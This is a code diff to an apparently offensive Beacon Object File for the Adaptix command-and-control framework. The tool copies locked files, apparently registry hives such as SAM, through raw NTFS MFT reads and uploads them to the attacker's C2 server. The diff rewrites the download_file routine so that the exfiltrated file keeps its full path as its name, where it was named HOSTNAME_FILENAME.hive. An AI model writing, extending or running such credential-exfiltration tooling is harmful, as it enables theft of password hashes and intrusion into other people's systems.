@@ -893,96 +893,63 @@ BOOL CopyFileByMftToMemory(HANDLE hVolume, FILE_INFO* fileInfo, NTFS_BOOT* boot,
 }
 
 // Download file to server using Adaptix API
-// Format: HOSTNAME_FILENAME.hive
 BOOL download_file(IN LPCSTR sourcePath, IN LPCSTR customFileName, IN char* fileData, IN ULONG32 fileLength) {
     if (!fileData || fileLength == 0) {
         return FALSE;
     }
     
-    // Get hostname
-    DWORD hostnameSize = MAX_COMPUTERNAME_LENGTH + 1;
-    char* hostname = (char*)intAlloc(hostnameSize);
-    if (!hostname) {
-        return FALSE;
-    }
-    
-    if (!KERNEL32$GetComputerNameA(hostname, &hostnameSize)) {
-        intFree(hostname);
-        return FALSE;
-    }
-    
-    // Extract filename from source path or use custom filename
-    char* fileName = NULL;
-    BOOL needFreeFileName = FALSE;
-    
+    // Use source path for display name
+    LPCSTR pathToResolve = sourcePath;
     if (customFileName && MSVCRT$strlen(customFileName) > 0) {
-        // Extract filename from custom path (e.g., ".\SAM2" -> "SAM2")
-        char* lastSlash = MSVCRT$strrchr(customFileName, '\\');
-        if (!lastSlash) {
-            lastSlash = MSVCRT$strrchr(customFileName, '/');
-        }
-        
-        const char* fileNamePtr = lastSlash ? (lastSlash + 1) : customFileName;
-        int fileNameLen = MSVCRT$strlen(fileNamePtr) + 1;
-        fileName = (char*)intAlloc(fileNameLen);
-        if (!fileName) {
-            intFree(hostname);
-            return FALSE;
-        }
-        MSVCRT$strcpy(fileName, fileNamePtr);
-        needFreeFileName = TRUE;
-    } else if (sourcePath) {
-        // Extract filename from source path
-        char* lastSlash = MSVCRT$strrchr(sourcePath, '\\');
-        if (!lastSlash) {
-            lastSlash = MSVCRT$strrchr(sourcePath, '/');
-        }
-        
-        const char* fileNamePtr = lastSlash ? (lastSlash + 1) : sourcePath;
-        int fileNameLen = MSVCRT$strlen(fileNamePtr) + 1;
-        fileName = (char*)intAlloc(fileNameLen);
-        if (!fileName) {
-            intFree(hostname);
-            return FALSE;
-        }
-        MSVCRT$strcpy(fileName, fileNamePtr);
-        needFreeFileName = TRUE;
-    } else {
-        intFree(hostname);
+        pathToResolve = customFileName;
+    }
+    if (!pathToResolve || MSVCRT$strlen(pathToResolve) == 0) {
         return FALSE;
     }
     
-    // Remove extension from filename if present
-    char* fileExt = MSVCRT$strrchr(fileName, '.');
-    int baseNameLen = fileExt ? (fileExt - fileName) : MSVCRT$strlen(fileName);
+    // Convert path to wide for GetFullPathNameW
+    int pathLen = MSVCRT$strlen(pathToResolve) + 1;
+    int wideLen = KERNEL32$MultiByteToWideChar(CP_ACP, 0, pathToResolve, pathLen, NULL, 0);
+    if (wideLen <= 0) {
+        return FALSE;
+    }
+    WCHAR* pathW = (WCHAR*)intAlloc(wideLen * sizeof(WCHAR));
+    if (!pathW) {
+        return FALSE;
+    }
+    KERNEL32$MultiByteToWideChar(CP_ACP, 0, pathToResolve, pathLen, pathW, wideLen);
     
-    // Allocate buffer for final filename: HOSTNAME_FILENAME.hive
-    int finalNameLen = hostnameSize + baseNameLen + 6; // +6 for "_" and ".hive\0"
-    char* finalFileName = (char*)intAlloc(finalNameLen);
+    // Resolve to full path
+    WCHAR fullPathW[MAX_PATH];
+    DWORD fullLen = KERNEL32$GetFullPathNameW(pathW, MAX_PATH, fullPathW, NULL);
+    intFree(pathW);
+    
+    char* finalFileName = NULL;
+    if (fullLen > 0 && fullLen < MAX_PATH) {
+        // Convert full path back to ANSI for AxDownloadMemory
+        int ansiLen = KERNEL32$WideCharToMultiByte(CP_ACP, 0, fullPathW, (int)(fullLen + 1), NULL, 0, NULL, NULL);
+        if (ansiLen > 0) {
+            finalFileName = (char*)intAlloc(ansiLen);
+            if (finalFileName) {
+                KERNEL32$WideCharToMultiByte(CP_ACP, 0, fullPathW, (int)(fullLen + 1), finalFileName, ansiLen, NULL, NULL);
+            }
+        }
+    }
     if (!finalFileName) {
-        if (needFreeFileName) {
-            intFree(fileName);
+        // Fallback: use original path as-is
+        int pathSize = MSVCRT$strlen(pathToResolve) + 1;
+        finalFileName = (char*)intAlloc(pathSize);
+        if (!finalFileName) {
+            return FALSE;
         }
-        intFree(hostname);
-        return FALSE;
+        MSVCRT$strcpy(finalFileName, pathToResolve);
     }
-    
-    // Build filename: HOSTNAME_FILENAME.hive
-    MSVCRT$sprintf(finalFileName, "%.*s_%.*s.hive", 
-        (int)hostnameSize, hostname,
-        baseNameLen, fileName);
     
     // Download to server
     AxDownloadMemory(finalFileName, fileData, (int)fileLength);
     BeaconPrintf(CALLBACK_OUTPUT, "[+] File downloaded to server: %s (%lu bytes)\n", finalFileName, fileLength);
     
-    // Cleanup
     intFree(finalFileName);
-    if (needFreeFileName) {
-        intFree(fileName);
-    }
-    intFree(hostname);
-    
     return TRUE;
 }
 
@@ -1135,7 +1102,7 @@ void go(char* args, int len) {
                 hOutput = INVALID_HANDLE_VALUE;
             }
             
-            // Download to server with format: HOSTNAME_FILENAME.hive
+            // Download to server
             if (download_file(sourceFile, destFile, (char*)fileBuffer, (ULONG32)copiedSize)) {
                 success = TRUE;
                 BeaconPrintf(CALLBACK_OUTPUT, "[+] File copied and downloaded to server: %llu bytes\n", copiedSize);
